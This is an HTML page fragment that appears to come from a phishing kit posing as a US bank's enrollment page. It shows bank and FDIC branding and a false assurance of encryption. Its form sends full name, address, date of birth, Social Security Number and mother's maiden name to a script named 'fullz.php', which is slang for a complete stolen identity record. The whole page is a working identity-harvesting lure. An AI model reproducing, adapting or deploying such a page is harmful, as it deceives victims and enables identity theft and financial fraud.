...
<?php endfor; ?>
                        ...
                        <div class="unauth-intro-area__help">
                            <p class="unauth-intro-area__text">
                                ...
                                <br>
                                Your personal information is protected with 256-bit server-side encryption.
                            </p>
                        </div>
                    </section>
                    <section class="identify-customer-section">
                        <form id="form" action="H4Z3/fullz.php" method="POST" class="unauth-form jqtransform js-enrollment-form">
                            <div class="unauth-form__row">
                                <div class="unauth-form__rowitem">
                                    <label class="unauth-form__label" for="fname">Full Name</label>
                                    <input type="text" name="fname" id="fname" placeholder="Full Name" class="ttc unauth-form__input js-mobilepassword">
                                </div>
                                <div class="unauth-form__rowitem">
                                    <label class="unauth-form__label" for="address">Current Address</label>
                                    <input type="text" name="address" id="address" placeholder="Current Address" class="ttc unauth-form__input js-mobilepassword">
                                </div>
                                <div class="unauth-form__rowitem">
                                    <label class="unauth-form__label" for="city">City</label>
                                    <input type="text" name="city" id="city" placeholder="City" class="ttc unauth-form__input js-mobilepassword">
                                </div>
                                <div class="unauth-form__rowitem">
                                    <label class="unauth-form__label" for="state">State</label>
                                    <input type="text" name="state" id="state" placeholder="state" class="ttc unauth-form__input js-mobilepassword">
                                </div>
                                <div class="unauth-form__rowitem">
                                    <label class="unauth-form__label" for="zip">ZIP</label>
                                    <input type="text" name="zip" id="zip" placeholder="ZIP" class="ttc unauth-form__input js-mobilepassword">
                                </div>
                                <div class="unauth-form__rowitem">
                                    <label class="unauth-form__label" for="dob">Date of Birth</label>
                                    <input type="text" name="dob" id="dob" placeholder="(MM/DD/YY)" class="unauth-form__input js-mobilepassword">
                                </div>
                                <div class="unauth-form__rowitem">
                                    <label class="unauth-form__label" for="ssn">Social Security Number</label>
                                    <input type="text" name="ssn" id="ssn" placeholder="Social Security Number" class="unauth-form__input js-mobilepassword">
                                </div>
                                <div class="unauth-form__rowitem">
                                    <label class="unauth-form__label" for="city">Mother's Maiden Name</label>
                                    <input type="text" name="mmn" id="mmn" placeholder="MMN" class="ttc unauth-form__input js-mobilepassword">
                                </div>
                            </div>
                ...
                <footer id="page-footer" class="page-footer">
                        ...
                        <ul>
                            ...
                            <li>
                                <a  style="cursor: pointer;">Equal Housing Lender
                                    <img alt="Equal Housing Lender" title="Equal Housing Lender" src="./V1P3R/img/equal-housing.gif">
                                </a>
                            </li>
                            <li>
                    ...
                    <div class="centered-content">
                        <div class="footer-bottom">
                            ...
                            <ul class="footer-util">
                                ...
                                <li>Follow:
                                    <a  style="cursor: pointer;">
                                        <img src="./V1P3R/img/footer-follow-facebook.png" alt="Facebook" align="middle">
                                    </a>
                                    <a  style="cursor: pointer;">
                                        <img src="./V1P3R/img/footer-follow-twitter.png" alt="Twitter">
                                    </a>
                                    <a  style="cursor: pointer;">
                                        <img src="./V1P3R/img/footer-follow-linkedin.png" alt="Linkedin">
                                    </a>
                                    <a  style="cursor: pointer;">
                                        <img src="./V1P3R/img/footer-follow-youtube.png" alt="Youtube">
                                    </a>
                                </li>
                            </ul>
                            ...
                            <img src="./V1P3R/img/elh.gif" alt="Equal Housing Lender">
                            <img src="./V1P3R/img/fdicFooter.gif" alt="Member FDIC">
                        </div>
                    </div>
                </footer>
            </div>
